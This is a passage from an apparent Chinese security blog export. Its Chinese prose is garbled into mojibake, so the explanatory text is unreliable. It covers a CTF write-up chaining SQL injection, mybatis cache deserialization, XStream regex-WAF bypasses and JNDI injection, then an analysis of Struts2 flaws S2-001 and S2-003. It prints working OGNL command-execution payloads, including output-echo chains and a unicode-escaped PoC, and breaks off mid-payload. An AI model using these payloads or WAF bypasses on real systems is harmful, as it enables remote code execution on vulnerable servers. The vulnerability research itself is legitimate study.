åˆ°è¿™é‡Œå°±ç®€å•äº†ï¼Œæˆ‘ä»¬åªè¦æ‰¾ä¸€ä¸‹ï¼Œè°ƒç”¨ç‚¹ç¡®è®¤æ˜¯å¦å¯æ§ï¼Œå³å¯ç¡®è®¤æ˜¯å¦å­˜åœ¨æ³¨å…¥ nese.game.controller.CheckControllerå­˜åœ¨é“¾è·¯ï¼Œä»æ–‡ä»¶ä¸­è·å–å†…å®¹ï¼Œå¹¶è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œæ‰€ä»¥è¿™è¾¹æˆ‘ä»¬èƒ½è¾¾åˆ°ä¸€ä¸ªæ³¨å…¥çš„æ•ˆæœ #3 mybatisäºŒçº§ç¼“å­˜ååºåˆ—åŒ–æ¼æ´æ¥ä¸‹æ¥ï¼Œç»§ç»­è¿›è¡Œå®¡è®¡ï¼Œå…³æ³¨ä¸€ä¸‹å¦ä¸€ä¸ªç‚¹xstreamåŒ…çš„å®‰å…¨é—®é¢˜ã€‚åœ¨nese.game.entity.Pictureå¯¹è±¡ä¸Šï¼Œè°ƒç”¨äº†xstreamçš„fromXMLå‡½æ•°ï¼Œå¹¶ä¸”åœ¨readObjectå‡½æ•°å¤„å¯¹å­—ç¬¦ä¸²ç±»å‹çš„xmlè¿›è¡Œè¿˜åŸ åˆ°è¿™é‡Œå°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨å‰é¢å‘ç°çš„SQLæ³¨å…¥ç‚¹ï¼Œè¿›è¡Œæ³¨å…¥æ„é€ ä»»æ„çš„xmlæ•°æ® å¹¶åˆ©ç”¨mybatisçš„é»˜è®¤äºŒçº§ç¼“å­˜ä½¿ç”¨serializationçš„åŸç†ï¼ˆå¦‚ä¸‹å›¾å®˜æ–¹æ–‡æ¡£æ‰€ç¤ºï¼‰ï¼Œæ¥è§¦å‘xstreamååºåˆ—åŒ–æ¼æ´ æ¥ä¸‹æ¥ï¼Œå°±æ ¹æ®é¢˜ç›®çš„ç­¾åå®ç°ï¼Œæ¥æ³¨å…¥ä»»æ„æ•°æ®ï¼Œä»¥å¦‚ä¸‹ä»£ç ä¸ºä¾‹ï¼Œç”Ÿæˆå­˜åœ¨æ³¨å…¥è¯­å¥çš„jpgæ–‡ä»¶ 1234567891011121314try&#123; String payload = &quot;evil xml&quot;; File file = new File(&quot;xxxx.jpg&quot;); File dest = new File(&quot;xxxx.jpg&quot;); InputStream inputStream = new FileInputStream(file); byte[] bytes = new byte[(int)file.length()]; inputStream.read(bytes); InputStream destInputStream = new FileInputStream(dest); String secret=&quot;&apos; union select 13,&apos;wh1t3p1g&apos;,&apos;wh1t3p1g&apos;,&apos;&quot;+payload+&quot;&apos;,&apos;aed2bebb781ae32d94c5e67185e35149&quot;; String hash = &quot;aed2bebb781ae32d94c5e67185e35149&quot;; ImageUtil.transferTo(inputStream, bytes, null, dest, secret, hash);&#125;catch (Exception e)&#123; e.printStackTrace();&#125; æäº¤åå¯ä»¥çœ‹åˆ°å…·ä½“çš„æ•ˆæœï¼Œé‡å¤æäº¤ä¸¤æ¬¡ï¼Œå³å¯è§¦å‘xmlçš„ååºåˆ—åŒ– #4 XStreamæ­£åˆ™wafç»•è¿‡ä»é¢˜ç›®ä¸Šæ¥çœ‹ï¼ŒXStreamçš„å®ç°éœ€è¦ç»•è¿‡ä¸¤ä¸ªç‚¹ï¼š PureJavaReflectionProvider PureJavaReflectionProviderä¸æ”¯æŒä¸å­˜åœ¨æ— å‚æ„é€ å‡½æ•°çš„ç±»çš„è¿˜åŸï¼Œä»¥åŠè¯¥ç±»å¦‚æœæ˜¯å¯åºåˆ—åŒ–çš„ï¼Œé‚£ä¹ˆå®ƒçš„readObjectä¸èƒ½æœ‰ç±»å±æ€§ä¸Šçš„è¿˜åŸã€‚è¿™æ˜¯å› ä¸ºPureJavaReflectionProviderå¯¹äºååºåˆ—åŒ–çš„æ“ä½œï¼Œå¹¶éæ˜¯ä¸€ä¸ªé€’å½’çš„è¿‡ç¨‹ï¼Œæœ‰ç©ºå†å†™è¿™ä¸ªåˆ†æï¼šï¼‰ æ­£åˆ™waf é¢˜ç›®å¹¶æ²¡æœ‰éµå¾ªXStreamå®˜æ–¹çš„ç±»ç¦ç”¨æ–¹æ³•ï¼Œè€Œæ˜¯é‡‡ç”¨æ­£åˆ™çš„æ–¹å¼å…ˆå¯¹å¾…ååºåˆ—åŒ–çš„xmlå­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œæ£€æµ‹é€šè¿‡åå†è¿›è¡Œååºåˆ—åŒ–ã€‚ å…³äºç¬¬ä¸€ä¸ªç‚¹ï¼Œæ¯”è¾ƒå®¹æ˜“è§£å†³ï¼Œå‚è€ƒmarshalsecå¯¹äºspring jndiåˆ©ç”¨é“¾çš„å®ç°ï¼Œè¯¥é“¾ç¬¦åˆæˆ‘è¯´çš„è¦æ±‚ è€Œå¯¹äºç¬¬äºŒä¸ªç‚¹ï¼Œè¿™é‡Œæ²¡æœ‰ç”¨å®˜æ–¹çš„æ–¹æ³•ï¼Œæç¤ºäº†æˆ‘ä»¬éœ€è¦å¯¹å­—ç¬¦ä¸²ä¸Šåšäº›æ“ä½œæ¥ç»•è¿‡æ­£åˆ™wafã€‚æˆ‘ä»¬å‚è€ƒfastjsonçš„@typeçš„unicodeç¼–ç ç»•è¿‡æ–¹å¼ï¼Œå†çœ‹çœ‹æ˜¯å¦å¯¹äºXStreamï¼Œä¹ŸåŒæ ·å­˜åœ¨è¿™ç§é—®é¢˜ï¼Ÿ ç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œä»‹ç»ä¸€ä¸‹XStreamçš„ç¼–ç ç»•è¿‡ï¼š é’ˆå¯¹æ ‡ç­¾é»‘åå•çš„ç»•è¿‡ ä»¥spring jndiåˆ©ç”¨é“¾ä¸ºæ¡ˆä¾‹ 12&lt;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;&lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt; å½“å‰é»‘åå•ä¸ºorg[.]springframeworkï¼Œæ­¤æ—¶çš„ç»•è¿‡æ–¹æ³•å¯ä»¥ä¸º 12&lt;org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;&lt;/org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt; è¿™é‡Œçš„åŸç†åœ¨äºxstreamä¼šå¯¹ç¬¦åˆæ ¼å¼çš„16è¿›åˆ¶åšè½¬æ¢ com.thoughtworks.xstream.io.xml.AbstractXmlReader#unescapeXmlName com.thoughtworks.xstream.io.xml.XmlFriendlyNameCoder#decodeName 12345678910111213141516171819for (; i &lt; length; i++ ) &#123; char c = name.charAt(i); if (c == dollarReplacementFirstChar &amp;&amp; name.startsWith(dollarReplacement, i)) &#123; i += dollarReplacement.length() - 1; result.append('$'); &#125; else if (c == hexPrefixFirstChar &amp;&amp; name.startsWith(hexPrefix, i)) &#123; // å¤„ç†hexæ ¼å¼çš„æ ‡ç­¾å†…å®¹ï¼Œå…¶æ­£ç¡®æ ¼å¼ä¸º_.xxxx i += hexPrefix.length(); c = (char)Integer.parseInt(name.substring(i, i + 4), 16); i += 3; result.append(c); &#125; else if (c == escapeReplacementFirstChar &amp;&amp; name.startsWith(escapeCharReplacement, i)) &#123; i += escapeCharReplacement.length() - 1; result.append('_'); &#125; else &#123; result.append(c); &#125;&#125; ä»dollarReplacementï¼ŒhexPrefixï¼ŒescapeCharReplacementä¸‰è€…æ¥çœ‹ï¼Œæœ€ç»ˆä¸å½±å“æˆ‘ä»¬ç»•è¿‡çš„ä¸º16è¿›åˆ¶çš„å¤„ç†_.xxxxè½¬æ¢æˆå®é™…çš„å­—ç¬¦ã€‚ é’ˆå¯¹æ ‡ç­¾å±æ€§å†…å®¹çš„ç»•è¿‡ æ¡ˆä¾‹ 12&lt;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization=\"custom\"&gt;&lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt; æ­¤æ—¶çš„é»‘åå•ä¸ºcustomï¼Œé‚£ä¹ˆç»•è¿‡æ–¹æ³•å¯ä»¥ä¸º 12&lt;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization=\"cust&amp;#111;m\"&gt;&lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt; åŸç†ä¸ºè¯»å–å±æ€§å†…å®¹æ—¶ï¼Œä¼šåšç¬¦åˆè¦æ±‚çš„è½¬åŒ– com.sun.org.apache.xerces.internal.impl.XMLScanner scanAttributeValue è¯¥å‡½æ•°å†…å®¹æ¯”è¾ƒå¤šï¼Œä¸è´´å‡ºæ¥äº†ï¼Œä»883è¡Œåˆ°942è¡Œå‡åœ¨å¤„ç†htmlç¼–ç æ ¼å¼ï¼Œå¹¶å°†å…¶è½¬åŒ–ä¸ºå®é™…çš„å­—ç¬¦ æ‰€ä»¥è¿™é‡Œ&amp;#111;å°†è½¬åŒ–ä¸ºo é’ˆå¯¹æ ‡ç­¾å†…å®¹çš„ç»•è¿‡ æ¡ˆä¾‹ 123&lt;test&gt;ldap://xxxxx&lt;/test&gt; æ­¤æ—¶çš„é»‘åå•ä¸ºldap://ï¼Œå¯ä»¥ç”¨å¦‚ä¸‹çš„å‡ ç§æ–¹æ³•ç»•è¿‡ a. htmlç¼–ç  è¿™éƒ¨åˆ†åœ¨æå–æ•°æ®æ—¶ï¼ŒåŒæ ·å¯¹htmlç¼–ç çš„å†…å®¹åšäº†è½¬åŒ– 123&lt;test&gt;&amp;#108;dap://xxxxx&lt;/test&gt; è¿™éƒ¨åˆ†è·Ÿä¸Šé¢æ ‡ç­¾å±æ€§å†…å®¹çš„ç»•è¿‡çš„ä¸€æ ·ï¼Œä¸å†å™è¿° b. æ³¨é‡Šçš„æ–¹æ³• åœ¨å¤„ç†å®é™…çš„æ ‡ç­¾å†…å®¹æ—¶ï¼Œé‡åˆ°æ³¨è§†å†…å®¹å°†è¢«å¿½ç•¥æ‰ 123&lt;test&gt;ld&lt;!-- test --&gt;ap://xxxxx&lt;/test&gt; com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter#unmarshallField com.thoughtworks.xstream.io.xml.AbstractPullReader#getValue 123456789101112131415161718192021222324252627282930public String getValue() &#123; // ... Event event = readEvent(); while (true) &#123; if (event.type == TEXT) &#123; // å¤„ç†å­—ç¬¦ String text = event.value; if (text != null &amp;&amp; text.length() &gt; 0) &#123; if (last == null) &#123; last = text; &#125; else &#123; if (buffer == null) &#123; buffer = new StringBuffer(last); &#125; buffer.append(text); &#125; &#125; &#125; else if (event.type != COMMENT) &#123;// éå­—ç¬¦ ä¸” ä¸æ˜¯æ³¨é‡Šæ—¶ è·³å‡º break; &#125; event = readEvent(); // ç»§ç»­ &#125; reset(); if (buffer != null) &#123; return buffer.toString(); &#125; else &#123; return (last == null) ? \"\" : last; &#125;&#125; ä»å‰é¢çš„ä»£ç ä¸­æ¥çœ‹ï¼Œè¿™é‡Œä¸»è¦åœ¨å¯¹å­—ç¬¦è¿›è¡Œæ‹¼æ¥ï¼Œå¹¶ä¸”é‡åˆ°æ³¨é‡Šæ—¶å°†è·³è¿‡ï¼Œæ‰€ä»¥å¦‚æœåœ¨å†…å®¹ä¸­æ·»ä¸Šæ³¨é‡Šä¹Ÿèƒ½è¾¾åˆ°ç»•è¿‡çš„æ•ˆæœ ç»è¿‡ä¸Šé¢XStreamç±»å‹è§£æåˆ†æï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºç»•è¿‡æ­£åˆ™wafçš„payloadæ¥ #5 é«˜ç‰ˆæœ¬JNDIæ³¨å…¥çš„åˆ©ç”¨åœ¨ç”Ÿæˆå…·ä½“çš„expåï¼Œå¯ä»¥å¯¹å¤–å‘èµ·JNDIè¿æ¥ï¼Œåˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬éœ€è¦å»åˆ¤æ–­å…¶ä¸ºé«˜ç‰ˆæœ¬jdkè¿˜æ˜¯ä½ç‰ˆæœ¬çš„jdkã€‚å¦‚æœæ˜¯ä½ç‰ˆæœ¬çš„jdkï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨codebaseåŠ è½½ä»»æ„çš„classæ¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœï¼Œè€Œé«˜ç‰ˆæœ¬çš„jdkåªèƒ½ä¾èµ–æœ¬åœ°ObjectFactoryæˆ–æœ¬åœ°åˆ©ç”¨é“¾æ¥è¿›è¡Œæ”»å‡»ï¼Œå‚è€ƒKINGXçš„æ–‡ç« ã€‚ è€Œæœ¬é¢˜è€ƒæŸ¥çš„ä¸ºé«˜ç‰ˆæœ¬jdkç¯å¢ƒä¸‹çš„åˆ©ç”¨ï¼Œé‚£ä¹ˆå°±æœ‰ä¸¤ç§é€‰æ‹©ï¼Œä¸€ä¸ºæœ¬åœ°åˆ©ç”¨é“¾è§¦å‘å‘½ä»¤æ¥æ‰§è¡Œï¼ŒäºŒä¸ºæœ¬åœ°ObjectFactoryè¾¾æˆä»£ç æ‰§è¡Œã€‚ ä»é¢˜ç›®çš„ä¾èµ–æ¥çœ‹ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„æœ¬åœ°åˆ©ç”¨é“¾æ¥è¾¾æˆåˆ©ç”¨ï¼Œé‚£ä¹ˆè€ƒå¯Ÿçš„å°±æ˜¯ç¬¬äºŒä¸ªæ–¹æ³•çš„åˆ©ç”¨äº†ã€‚å› ä¸ºé¢˜ç›®ç”¨çš„æ˜¯spring boot embedded tomcatï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½ç›´æ¥åˆ©ç”¨KINGXå¸ˆå‚…æ–‡ç« ä¸­æåˆ°çš„æ–¹æ³•ï¼Œå…·ä½“çš„åˆ©ç”¨è¿‡ç¨‹ä¸æäº†ï¼Œå¯ä»¥ç”¨æˆ‘çš„ysomapæ¥è¾¾æˆå‘½ä»¤æ‰§è¡Œçš„æ•ˆæœ 0x02 expexp.java"},{"title":"struts2å†å²æ¼æ´åˆ†æ","permalink":"http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/","text":"0x00 å‰è¨€ 17å¹´çš„æ—¶å€™æ•´ç†è¿‡struts2ç›¸å…³çš„POCï¼Œæ—¶éš”3å¹´ï¼Œè™½ç„¶struts2å·²ç»ä¸å†é‚£ä¹ˆæµè¡Œäº†ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤§çš„ç ”ç©¶ä»·å€¼ï¼Œæœ¬æ–‡å°†ä¸€ç‚¹ä¸€ç‚¹è·Ÿä¸€ä¸‹struts2 æœ‰ä»·å€¼çš„æ¼æ´XD 0x01 åŸºç¡€ struts2 æºç ä¸‹è½½https://archive.apache.org/dist/struts/source/ struts2å·¥ä½œæµç¨‹ https://blog.csdn.net/snow_7/article/details/51513381 ognlè¡¨è¾¾å¼https://www.cnblogs.com/renchunxiao/p/3423299.html struts2 æŠ€æœ¯å†…å¹• ç¬¬6ç«  OGNL struts2æ¼æ´çš„äº§ç”Ÿé€šOGNLè¡¨è¾¾å¼çš„æ‰§è¡Œæœ‰å¾ˆå¤§çš„å…³è”ï¼Œå†å²ä¸Šå¾ˆå¤šç‰ˆæœ¬çš„æ¼æ´ï¼Œéƒ½æ˜¯å› ä¸ºä¸å®‰å…¨çš„ç”¨æˆ·è¾“å…¥æµè½¬åˆ°äº†Ognl.getValueã€Ognl.setValueè€Œå¯¼è‡´çš„OGNLè¡¨è¾¾å¼çš„è®¡ç®—ã€‚åæ–‡ä¸å¯¹Ognlåç»­çš„å†…å®¹åšåˆ†æ 123// è°ƒç”¨é™æ€å‡½æ•° æ‰§è¡Œå‘½ä»¤Ognl.getValue(\"@java.lang.Runtime@getRuntime().exec('open /Applications/Calculator.app/')\", context);Ognl.setValue(\"(\\\"@java.lang.Runtime@getRuntime().exec(\\'open /System/Applications/Calculator.app/\\')\\\")(bla)(bla)\",context,\"\"); æ›´å¤šç”¨æ³•çœ‹http://commons.apache.org/proper/commons-ognl/language-guide.html å…¶ä¸­å…³äºsetValueçš„åˆ©ç”¨ç”¨çš„æ˜¯Expression Evaluationéƒ¨åˆ†ï¼Œ(1)(2)(3)ä¸­(1)(2)è¢«ä½œä¸ºä¸€ä¸ªæ•´ä½“è§£æï¼Œå¯¹äº(1)åšè¡¨è¾¾å¼çš„è§£æï¼Œå¦‚æœä½ ç”¨getValue((1)(2))ä¼šå‘ç°å…¶å®ä¹Ÿèƒ½æ‰§è¡Œå‘½ä»¤ï¼Œè€ŒsetValue((1)(2)(3))éœ€è¦double evaluationï¼Œå®é™…ä¸Šå˜æˆ((1)(2))(3)ï¼Œåœ¨åç»­è°ƒç”¨setValueBodyå‡½æ•°æ—¶å–å‡ºçš„children[0]å°±æ˜¯(1)(2)ï¼Œç­‰åŒäºè°ƒç”¨Ognl.getValue((1)(2))çš„æ•ˆæœã€‚æ‰€ä»¥è¿™é‡Œè°ƒç”¨setValueä¹ŸåŒæ ·å¯ä»¥è¾¾æˆgetValueçš„è®¡ç®—OGNLè¡¨è¾¾å¼çš„æ•ˆæœã€‚ åŒæ ·ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨children[1]çš„ä½ç½®ï¼Œå¦‚(1)((2)(3))æŠŠpayloadæ”¾åˆ°(2)(3) å…³äºsetValueå‡½æ•°çš„å¦ä¸€ç§åˆ©ç”¨æ–¹æ³•S2-009çš„æ–¹å¼a[(1)(2)]ï¼Œå…¶ä¸­(1)(2)åç»­ä¼šå•ç‹¬æ‹¿å‡ºæ¥è¢«å½“ä½œOGNLè¡¨è¾¾å¼æ‰§è¡Œã€‚ 0x02 å†å²ç‰ˆæœ¬å›é¡¾ 1. S2-001å‚è€ƒï¼šhttps://xz.aliyun.com/t/2044 æ¼æ´äº§ç”ŸåŸå› åœ¨äºï¼šç”¨&lt;s:textfield&gt;æ ‡ç­¾ï¼ŒåŸæ ·è¿”å›ç”¨æˆ·è¾“å…¥æ—¶ï¼Œä¼šè¿‡ä¸€æ¬¡OGNLè¡¨è¾¾å¼çš„è§£ææ‰§è¡Œã€‚æ¯”å¦‚åœºæ™¯ç™»é™†çš„åœ°æ–¹ï¼Œç”¨æˆ·åå¯†ç æ ¡éªŒé”™è¯¯ï¼Œä¸è·³è½¬é¡µé¢ï¼Œç›´æ¥å°†ç”¨æˆ·åå’Œå¯†ç æ”¾åˆ°é¡µé¢è§£æåè¿”å›ã€‚ source: ä½¿ç”¨äº†s:textfieldæ ‡ç­¾ç”¨äºè¡¨å•ç”Ÿæˆï¼Œå½“ç”¨æˆ·è¾“å…¥ä¸åˆæ³•æ—¶ï¼Œå°†ç”¨æˆ·çš„è¾“å…¥å†…å®¹æ¸²æŸ“åˆ°è¿”å›çš„é¡µé¢ä¸Š sink: jspæ¸²æŸ“è°ƒç”¨doEndTagï¼Œåç»­ç”±äºè¯†åˆ«å‡ºç”¨æˆ·è¾“å…¥ä¸­OGNLè¡¨è¾¾å¼è€Œè°ƒç”¨Ognl.getValue æ¼æ´åˆ†æä¸»è¦å‡ºé—®é¢˜çš„æ˜¯JSPä¸­&lt;s:textfield&gt;æ ‡ç­¾ï¼ŒStruts2é‡Œå¤„ç†textfieldçš„æ˜¯org.apache.struts2.components.UIBean çœ‹åˆ°åœ¨å¤„ç†paramsæ—¶ï¼Œå½“parametersé‡Œä¸å­˜åœ¨valueè¿™ä¸ªkeyçš„æ—¶å€™ï¼Œä¼šè¿›åˆ°æ‰§è¡Œnameç›¸å¯¹åº”çš„valueä¸Šæ¥ã€‚å¹¶ä¸”altSyntaxé»˜è®¤é…ç½®ä¸ºtrue ä¼šåœ¨å½“å‰çš„nameå·¦å³åŠ ä¸ŠOGNLè¡¨è¾¾å¼çš„æ ‡è¯†%{name}ï¼Œè¿™é‡Œçš„nameæ˜¯&lt;s:textfield name=&quot;name&quot;ï¼Œnameå­—æ®µçš„å€¼ï¼Œæ¯”å¦‚è¿™é‡Œname=&quot;username&quot;ï¼Œæ­¤æ—¶ä¼šå˜æˆ%{username}.ç»§ç»­å¾€ä¸‹è·Ÿ è¿™é‡Œçš„Stringç±»å‹çš„è½¬åŒ–ä¸»è¦ç”¨äº†TextParesUtil.translateVariables()æ¥å¤„ç†ï¼Œè¿™é‡Œçœ‹çœ‹å…·ä½“ä»–æ€ä¹ˆåšçš„ com.opensymphony.xwork2.util.TextParseUtil#translateVariables#97 è¿™é‡Œä¼šå»åˆ¤æ–­ä¼ å…¥çš„expressionæ˜¯å¦æ˜¯OGNLè¡¨è¾¾å¼çš„æ ¼å¼çš„%{xxx}ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°±ä¼šå»OgnlValueStacké‡Œé¢å»æ‰¾å¯¹åº”çš„å†…å®¹(è¿™å—å°±æ˜¯OGNLè¡¨è¾¾å¼çš„è®¡ç®—ç»“æœï¼ŒfindValueå‡½æ•°åç»­ä¼šå»è°ƒç”¨OgnlUtil.getValueï¼Œè¯¦ç»†çš„å¯ä»¥çœ‹æˆ‘åŸºç¡€é‡Œåˆ—çš„æ–‡ç« ) æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ç¬¬ä¸€éä¼ å…¥çš„%{name}ä¼šè§£æè·å¾—å¯¹åº”çš„å€¼%{@java.lang.Runtime.....} ç¬¬äºŒéä¼šå»è§£æ%{@java.lang.Runtime....}ï¼Œè¿™é‡Œæ‰§è¡Œäº†æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ å›æ˜¾POCå‰é¢ç®€å•ç”¨äº†OGNLè¡¨è¾¾å¼è°ƒç”¨é™æ€æ–¹æ³•çš„å½¢å¼æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤@java.lang.Runtime@getRuntime().exec(command) è¿™é‡ŒS2-001å…¶å®æ˜¯ä¼šç›´æ¥å›æ˜¾çš„ï¼Œå°†æ›¿æ¢åŸæœ‰çš„inputæ ‡ç­¾çš„å†…å®¹ï¼Œè¿™é‡Œæ¢ä¸€ç§æ–¹å¼æ¥è¿›è¡Œå›æ˜¾ï¼Œåˆ©ç”¨Struts2çš„HttpServletResponseæ¥å†™å…¥å†…å®¹ã€‚ 1234#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#writer.println(xxxxxx),#writer.flush(),#writer.close() å…ˆä»ä¸Šä¸‹æ–‡contextä¸­å–å‡ºHttpServletResponseçš„å®ä¾‹ï¼Œç”¨åˆ°çš„å®é™…æ˜¯HttpServletResponseWrapper ç„¶åè·å–å½“å‰responseçš„writerå¯¹è±¡ï¼Œåœ¨åˆ©ç”¨è¯¥writeræ¥å†™å…¥ä»»æ„å†…å®¹ æ¯”å¦‚ 1%&#123;#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#writer.println(&quot;wh1t3p1g&quot;),#writer.flush(),#writer.close()&#125; å½“ç„¶ä½ ä¹Ÿå¯ä»¥æ›¿æ¢æˆæ‰§è¡Œå‘½ä»¤åçš„å†…å®¹ 1234567891011121314#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#is=#pb.getInputStream(),#isr=new InputStreamReader(#is),#br=new BufferedReader(#isr),#chars=new char[500],#br.read(#chars),#str=new java.lang.String(#chars),// ä¸Šé¢ä¸»è¦è·å–æ‰§è¡Œåçš„å†…å®¹ï¼Œä¸‹é¢ä¸»è¦åšå›æ˜¾æ“ä½œ#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#writer.println(#str),#writer.flush(),#writer.close()%&#123;#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#is=#pb.getInputStream(),#isr=new java.io.InputStreamReader(#is),#br=new java.io.BufferedReader(#isr),#chars=new char[500],#br.read(#chars),#str=new java.lang.String(#chars),#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(), #writer.println(#str),#writer.flush(),#writer.close()&#125; ä¿®å¤åœ¨&gt;=2.0.9ç‰ˆæœ¬çš„struts2ä¸Šï¼Œcom.opensymphony.xwork2.util.TextParseUtil#translateVariablesåšäº†å¾ªç¯åˆ¤æ–­ï¼Œä¸å…è®¸é€’å½’æ‰§è¡ŒOGNLè¡¨è¾¾å¼ é»˜è®¤maxLoopCountä¸º1ï¼Œæ‰€ä»¥å¤„ç†å®Œ%{name}åï¼Œä¸ä¼šå†ç»§ç»­å¯¹ä»–çš„å€¼è¿›è¡ŒOGNLè¡¨è¾¾å¼çš„æ‰§è¡Œäº†ã€‚ 2. S2-003å½±å“èŒƒå›´ï¼š2.0.0 - 2.0.11.2 çœ‹å®˜ç½‘çš„ä»‹ç»ï¼Œé—®é¢˜å‡ºåœ¨ParametersInterceptorï¼Œå‰é¢åˆ©ç”¨äº†Ognl.getValueæ¥è®¡ç®—OGNLè¡¨è¾¾å¼ï¼Œè€ŒS2-003ç”¨çš„åˆ™æ˜¯Ognl.setValueï¼Œè¯¥å‡½æ•°ä¹ŸåŒæ ·å¯ä»¥è®¡ç®—OGNLè¡¨è¾¾å¼ source: å‚æ•°çš„keyï¼Œä½¿ç”¨unicodeç¼–ç ç»•è¿‡#çš„æ£€æµ‹ sink: è°ƒç”¨Ognl.setValue æ¼æ´åˆ†æStruts2åœ¨å¤„ç†å‚æ•°å†…å®¹æ—¶ï¼Œå°†è°ƒç”¨com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameterså‡½æ•°ï¼Œå¡«å……åˆ°OgnlVauleStackçš„contextä¸Šä¸‹æ–‡é‡Œã€‚ è¿™é‡Œä¼šå…ˆè¿‡ä¸€æ¬¡acceptableNameçš„æ£€æŸ¥ï¼ˆ2.0.8ç‰ˆæœ¬ï¼‰ ä¸èƒ½å‡ºç°=ã€,ã€#ã€:ä»¥åŠè¢«æ’é™¤åœ¨å¤–çš„å‚æ•°å åªæœ‰é€šè¿‡äº†acceptableNameå‡½æ•°çš„æ£€æŸ¥æ‰èƒ½ç»§ç»­å¾€ä¸‹èµ°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»ç»•è¿‡ä¸Šé¢çš„å‡ ä¸ªé—®é¢˜ï¼Œè¿™é‡Œæ¼æ´å‘ç°è€…ç”¨äº†unicodeç¼–ç æ¥ç»•è¿‡æ£€æµ‹ã€‚ ognl.JavaCharStream#readChar å½“é‡åˆ°\\uunicodeç¼–ç ï¼Œä¼šåšä¸€æ¬¡è½¬æ¢ï¼Œæ¯”å¦‚\\u0040ä¼šè¢«è½¬æˆ@ è€ŒacceptableNameå‡½æ•°å¹¶æ²¡æœ‰è€ƒè™‘unicodeç¼–ç çš„æ–¹å¼ï¼Œå¯¼è‡´å…¶å½¢åŒè™šè®¾ã€‚ å›åˆ°setParametersï¼Œåç»­è°ƒç”¨äº†OgnlValueStack.setValue è¿™é‡Œæœ€ç»ˆåˆ°äº†OgnlUtil.setValueè®¡ç®—OGNLè¡¨è¾¾å¼ POCåˆ†ææ¥çœ‹ä¸€ä¸ªè°ƒç”¨å‘½ä»¤æ‰§è¡Œçš„POC 1('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)&amp;('\\u0040java.lang.Runtime@getRuntime().exec(\\'open /System/Applications/Calculator.app\\')')(bla)(bla) å…ˆæ¥çœ‹ç¬¬ä¸€å¥ï¼Œè¯¥æ¡ognlè¡¨è¾¾å¼ç”¨äºå¼€å¯æ–¹æ³•æ‰§è¡Œï¼Œå› ä¸ºåœ¨è°ƒç”¨setParametersä¹‹å‰ï¼Œå¼€å‘äººå‘˜è€ƒè™‘åˆ°äº†å‚æ•°æ‰§è¡ŒOGNLè¡¨è¾¾å¼çš„é£é™©ï¼Œæ‰€ä»¥æå‰å…³é—­äº†å‡½æ•°è°ƒç”¨æ‰§è¡Œ è®¾ç½®å®Œäº†ä¹‹åï¼Œå†è¿˜åŸå›æ¥ ä½†æ˜¯OGNLè¡¨è¾¾å¼å¯¹äºä¸Šä¸‹æ–‡çš„å†…å®¹æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿›è¡Œå‡½æ•°è°ƒç”¨å‰ï¼Œå°†contexté‡Œçš„xwork.MethodAccessor.denyMethodExecutionè®¾ä¸ºfalseï¼Œ è¿™æ ·ç¬¬äºŒå¥pocå°±å¯ä»¥æ‰§è¡Œå‡½æ•°è°ƒç”¨äº†ã€‚ æ‰€ä»¥åœ¨å‘é€è¿™ä¸¤æ¡POCæ—¶ï¼Œéœ€è¦æ§åˆ¶å¥½è®¾ç½®falseåœ¨å‰ï¼Œæ‰§è¡Œåœ¨åï¼ˆasciiæ’åºï¼Œå¯ä»¥çœ‹å›æ˜¾pocçš„å¤„ç†ï¼‰ è·Ÿå‰é¢ä¸€æ ·ï¼Œå†™ä¸€ä¸‹å›æ˜¾çš„POC 123456789(a)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla))(b)(('\\u0023ret\\u003d@java.lang.Runtime@getRuntime().exec(\\'id\\')')(bla))&amp; // 